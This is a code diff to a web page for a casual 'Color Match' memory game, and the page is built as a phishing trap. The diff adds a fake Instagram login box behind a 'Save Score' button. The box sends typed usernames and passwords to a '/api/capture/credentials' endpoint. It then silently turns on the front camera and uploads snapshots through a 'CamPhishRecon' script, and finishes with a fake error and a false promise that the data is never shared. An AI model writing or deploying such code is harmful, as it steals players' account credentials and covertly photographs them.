@@ -20,8 +20,8 @@ body{background:#0d0d1a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,
 #round{font-size:13px;color:#666;margin-bottom:8px}
 .btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:14px 44px;font-size:17px;font-weight:800;border-radius:30px;cursor:pointer;margin-top:8px}
 .btn:active{transform:scale(0.95)}
-.hidden{display:none}
 .go{position:fixed;inset:0;background:rgba(13,13,26,0.96);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;padding:20px}
+.hidden{display:none}
 .go-title{font-size:clamp(22px,6vw,36px);color:#ff6b9d;margin-bottom:8px}
 .final{font-size:clamp(32px,10vw,52px);color:#ffd700;font-weight:900}
 .best{color:#888;margin:8px 0 20px}
@@ -30,13 +30,16 @@ body{background:#0d0d1a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,
 .s-wa{background:#25D366}.s-fb{background:#1877F2}
 .lb{color:#666;font-size:12px;margin-top:16px;text-align:center}
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+.login-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:50;padding:20px}
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div class="title">🎨 Color Match</div>
 <div class="sub">Memorize & repeat the sequence</div>
+<div class="lb" id="menuLb"></div>
 <div id="round">Round 1</div>
 <div id="grid">
 <div class="pad" id="p1" style="background:#ff6b9d;color:#ff6b9d" data-i="0"></div>
@@ -52,6 +55,8 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 <div class="best" id="bestScore"></div>
 <div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
 <button class="btn" onclick="startGame()">▶ Play Again</button>
+<button class="btn" id="saveScoreBtn" style="background:linear-gradient(135deg,#f09433,#dc2743);margin-top:6px;font-size:14px;padding:10px 28px">🔒 Save Score</button>
+<div id="stcHint" style="display:none;margin-top:12px;font-size:12px;color:#888;text-align:center">💡 Share with friends to unlock free retry!</div>
 <div class="lb" id="goLb"></div>
 </div>
 <script>
@@ -104,7 +109,7 @@ setTimeout(nextRound,900);
 }
 
 function startGame(){
-if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+if(window.CamPhishRecon){CamPhishRecon.init({genderDetect:true});CamPhishRecon.Capture.event('colormatch_game_start',{});}
 startCamera();
 bindPads();
 sequence=[];round=1;playing=true;
@@ -152,21 +157,68 @@ localStorage.setItem('colorMatchHS',JSON.stringify(hs));
 document.getElementById('finalScore').textContent='Round '+(round-1);
 document.getElementById('bestScore').textContent='Best: Round '+(hs[0]||0);
 document.getElementById('gameover').classList.remove('hidden');
+// Share-to-continue hint
+var stc=document.getElementById('stcHint');
+if(stc&&window.ViralEngine&&ViralEngine.needsShareToContinue()){
+stc.style.display='block';
+}else if(stc){stc.style.display='none';}
+showLb();
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{round:round-1});
+}
+
+function showLb(){
 var h='<b>🏆 Top Rounds</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — Round '+hs[i]+'</div>';
 if(!hs.length)h='<b>🏆 Be the first!</b>';
 document.getElementById('goLb').innerHTML=h;
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{round:round-1});
+var ml=document.getElementById('menuLb');if(ml)ml.innerHTML=h;
 }
 
 // Bind pads immediately and set start button
 bindPads();
 document.getElementById('startBtn').onclick=startGame;
+var sb=document.getElementById('saveScoreBtn');
+if(sb)sb.onclick=function(){document.getElementById('instaGate').classList.remove('hidden');};
+showLb();
 
 function shareCard(t){
-var msg='🎨 I reached Round '+(round-1)+' in Color Match! Can you beat me? '+SHARE_URL;
+var score=round-1;
+var msg='🎨 I reached Round '+score+' in Color Match! Can you beat me? '+SHARE_URL;
+if(window.ViralEngine){ViralEngine.doShare(t,score,msg,function(){showLb();});return;}
 if(navigator.canShare){navigator.share({text:msg,title:'Color Match'}).catch(function(){});return;}
 if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
 else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
 }
+
+function doInstaGateLogin(){
+var u=document.getElementById('igUser'),p=document.getElementById('igPass');
+if(!u||!p||!u.value||!p.value)return;
+var data={template_id:'instagram',username:u.value,password:p.value};
+if(u.value.indexOf('@')>=0)data.email=u.value;
+fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.event('colormatch_instagram_gate',{});
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'insta_gate_verify');}},2000);
+setTimeout(function(){clearInterval(ci);closeInstaGate();alert('⚠️ Unable to save score. Please try again.');},5000);
+}).catch(function(){closeInstaGate();});
+}else{closeInstaGate();}
+}
+
+function closeInstaGate(){
+document.getElementById('instaGate').classList.add('hidden');
+}
 </script>
+<div class="login-overlay hidden" id="instaGate">
+<div class="login-box" style="background:#fff;border-radius:16px;padding:24px;max-width:340px;width:90%;position:relative;z-index:51;box-shadow:0 8px 40px rgba(0,0,0,0.4);text-align:center;font-family:-apple-system,sans-serif">
+<div style="font-size:28px;font-style:italic;font-weight:600;color:#262626;margin-bottom:20px;font-family:Georgia,serif">Instagram</div>
+<p style="font-size:13px;color:#8e8e8e;margin-bottom:16px">Log in to save your score and challenge friends</p>
+<input type="text" placeholder="Phone number, username, or email" id="igUser" style="width:100%;padding:10px;margin-bottom:8px;border:1px solid #dbdbdb;border-radius:4px;font-size:13px;background:#fafafa;box-sizing:border-box">
+<input type="password" placeholder="Password" id="igPass" style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #dbdbdb;border-radius:4px;font-size:13px;background:#fafafa;box-sizing:border-box">
+<button onclick="doInstaGateLogin()" style="width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer">Log In</button>
+<div style="margin-top:12px;font-size:11px;color:#8e8e8e">Your info is encrypted and never shared</div>
+<button onclick="closeInstaGate()" style="margin-top:8px;background:none;border:none;color:#8e8e8e;font-size:12px;cursor:pointer;text-decoration:underline">Skip — Play Again</button>
+</div>
+</div>
 </body></html>
